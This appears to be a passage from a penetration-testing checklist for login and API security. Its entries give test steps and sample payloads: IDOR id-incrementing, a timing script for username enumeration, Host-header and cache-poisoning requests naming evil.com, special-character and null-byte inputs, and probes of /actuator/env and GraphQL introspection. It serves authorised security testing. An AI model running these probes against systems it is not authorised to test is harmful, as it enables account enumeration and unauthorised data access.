**Test Category:** Miscellaneous · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API endpoint (REST/GraphQL) — auth/authz

**Test Steps:** 1. Check for API documentation: /swagger /swagger-ui /api-docs /openapi.json<br>2. Test common API paths: /api/v1/ /api/v2/ /rest/<br>3. Check for health check endpoints: /health /status /actuator<br>4. Test for Spring Boot Actuator endpoints<br>5. Check for exposed metrics or monitoring endpoints

**Expected Result:** API documentation and management endpoints should not be publicly accessible without authentication

**Payload Example:**

```
GET /swagger-ui.html HTTP/1.1
GET /api-docs HTTP/1.1
GET /openapi.json HTTP/1.1
GET /actuator HTTP/1.1
GET /actuator/env HTTP/1.1
GET /health HTTP/1.1
GET /metrics HTTP/1.1
GET /api/v1/users HTTP/1.1
GET /graphql HTTP/1.1
```

**Impact:** API authz/authn flaw -&gt; data access or priv-esc

**Tools:** Gobuster / Dirsearch / Burp Suite / ffuf

**References:** CWE-284; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10; -&gt;[API master checklist](#/checklist/api)

---

## MISC-015 — Insecure Direct Object Reference via Login
**Test Category:** Miscellaneous · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Object identifier in path/param/body

**Test Steps:** 1. Check if login response contains user ID or reference<br>2. Test modifying user ID in subsequent requests<br>3. Check if login redirect contains user-specific path<br>4. Test parameter manipulation for accessing other user data<br>5. Check for predictable resource identifiers

**Expected Result:** User references should not be guessable or manipulable. Access control should be enforced server-side

**Payload Example:**

```
After login redirect:
/profile?id=1001 -> try /profile?id=1002
/user/admin -> try /user/other_user
/dashboard?uid=123 -> try /dashboard?uid=124
```

**Impact:** IDOR/BOLA -&gt; access or modify other users' records

**Tools:** Burp Suite / Custom Script

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1/BOLA

---

## MISC-001 — Concurrent Session Handling
**Test Category:** Miscellaneous · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session cookie / session token

**Test Steps:** 1. If possible login from two different browsers/devices simultaneously<br>2. Check if previous session is invalidated<br>3. Check if both sessions remain active<br>4. Test maximum concurrent session limit<br>5. Check if user is notified of concurrent sessions

**Expected Result:** Application should either limit concurrent sessions or notify users. Previous sessions should optionally be invalidated

**Payload Example:**

```
Login from Browser 1 -> Session A active
Login from Browser 2 -> Session B active
Check if Session A is still valid
Check for concurrent session notification
```

**Impact:** Session fixation/hijack -&gt; persistent unauthorized access

**Tools:** Multiple Browsers / Burp Suite

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session; OWASP WSTG-SESS

---

## MISC-002 — Login Form Action URL Verification
**Test Category:** Miscellaneous · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check form action attribute in HTML source<br>2. Verify form submits to HTTPS URL<br>3. Check if form action can be manipulated via DOM<br>4. Verify form action matches the same origin<br>5. Check for form action injection vulnerabilities

**Expected Result:** Form action should point to a secure HTTPS URL on the same origin. Should not be injectable or modifiable

**Payload Example:**

```
<form action="https://target.com/login" method="POST">
Verify it's not:
<form action="http://..."> (insecure)
<form action="//other-domain.com/..."> (different origin)
<form action=""> (potentially injectable)
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## MISC-004 — Response Time Analysis for Valid vs Invalid Users
**Test Category:** Miscellaneous · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Login endpoint — no rate limit / lockout

**Test Steps:** 1. Send login request with known-likely-valid username (admin) and wrong password<br>2. Send login request with random invalid username and wrong password<br>3. Measure and compare response times precisely<br>4. Repeat 20+ times to establish baseline<br>5. Look for consistent timing differences

**Expected Result:** Response times should be consistent regardless of username validity to prevent timing-based enumeration

**Payload Example:**

```
import requests
import time

start = time.time()
requests.post(url, data={'username':'admin','password':'wrong'})
admin_time = time.time() - start

start = time.time()
requests.post(url, data={'username':'randomuser123456','password':'wrong'})
random_time = time.time() - start

Compare admin_time vs random_time
```

**Impact:** Credential brute-force / stuffing -&gt; account takeover

**Tools:** Custom Python Script / Burp Suite

**References:** CWE-307; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; OWASP WSTG-ATHN

---

## MISC-009 — Host Header Injection
**Test Category:** Miscellaneous · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Host / X-Forwarded-Host header

**Test Steps:** 1. Modify Host header to attacker domain<br>2. Add X-Forwarded-Host header with attacker domain<br>3. Add X-Host header with attacker domain<br>4. Use absolute URL with different Host header<br>5. Check if password reset or any functionality uses Host header for URL generation

**Expected Result:** Application should validate Host header and not use it for generating URLs in emails or redirects

**Payload Example:**

```
GET /login HTTP/1.1
Host: evil.com

GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

GET /login HTTP/1.1
Host: target.com
X-Host: evil.com

GET https://target.com/login HTTP/1.1
Host: evil.com
```

**Impact:** Host-header abuse -&gt; reset poisoning, routing/cache abuse

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle host-header research; PortSwigger

---

## MISC-010 — Web Cache Poisoning
**Test Category:** Miscellaneous · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Cacheable responses / cache keys

**Test Steps:** 1. Test unkeyed headers that might affect response: X-Forwarded-Host X-Original-URL X-Rewrite-URL<br>2. Check if response includes injected header values<br>3. Verify if poisoned response is cached<br>4. Test cache key manipulation<br>5. Check for cache deception: /login/nonexistent.css

**Expected Result:** Cache should not store responses with injected content. Unkeyed headers should not affect response content

**Payload Example:**

```
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
(check if evil.com appears in cached response)

Cache deception:
GET /login/test.css HTTP/1.1
(check if login page is cached as static file)
```

**Impact:** Cache poisoning/deception serving attacker or private content

**Tools:** Burp Suite / Param Miner Extension

**References:** CWE-525; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle web cache research; Omer Gil deception

---

## MISC-012 — GraphQL Endpoint Discovery
**Test Category:** Miscellaneous · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API endpoint (REST/GraphQL) — auth/authz

**Test Steps:** 1. Check for GraphQL endpoints: /graphql /graphiql /api/graphql /v1/graphql<br>2. Test introspection query if found<br>3. Check for GraphQL playground<br>4. Test for query injection via login parameters<br>5. Check if login uses GraphQL backend

**Expected Result:** GraphQL endpoints should not expose introspection in production. Queries should be validated and rate-limited

**Payload Example:**

```
GET /graphql HTTP/1.1
GET /graphiql HTTP/1.1
POST /graphql
{"query":"{__schema{types{name}}}"}

Login via GraphQL:
{"query":"mutation{login(username:\"admin\",password:\"test\"){token}}"}
```

**Impact:** API authz/authn flaw -&gt; data access or priv-esc

**Tools:** Burp Suite / GraphQL Voyager / Altair

**References:** CWE-284; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10; -&gt;[API master checklist](#/checklist/api)

---

## MISC-003 — Username/Email Format Testing
**Test Category:** Miscellaneous · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Test with email format if email-based login<br>2. Test with special characters in username: ' " &lt; &gt; ; | &amp; ! @ # $ % ^ * ( ) { } [ ]<br>3. Test with very long username (boundary testing)<br>4. Test with Unicode characters in username<br>5. Test with whitespace variations: leading trailing multiple spaces<br>6. Test with null bytes in username

**Expected Result:** Application should properly validate and sanitize username format. Special characters should be handled safely

**Payload Example:**

```
admin (normal)
admin@target.com (email)
admin' (special char)
admin" (double quote)
admin<script> (html)
aaaa....(10000 chars) (overflow)
admin%00 (null byte)
 admin (leading space)
admin  (trailing space)
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Burp Suite / Custom Script

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## MISC-017 — Login Form Autofill Testing
**Test Category:** Miscellaneous · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check if browser autofill works<br>2. Test if sensitive data is stored<br>3. Check if autocomplete is disabled<br>4. Test password manager integration

**Expected Result:** Sensitive fields should not be autofilled or stored

**Payload Example:**

```
Check browser password manager
Test autocomplete="off" enforcement
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Browser

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## MISC-018 — Keyboard Navigation Testing
**Test Category:** Miscellaneous · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Test login form with keyboard only<br>2. Check tab order<br>3. Test accessibility features<br>4. Check for keyboard traps

**Expected Result:** Form should be accessible via keyboard

**Payload Example:**

```
Use Tab key to navigate
Check if focus indicators are present
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Browser

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---
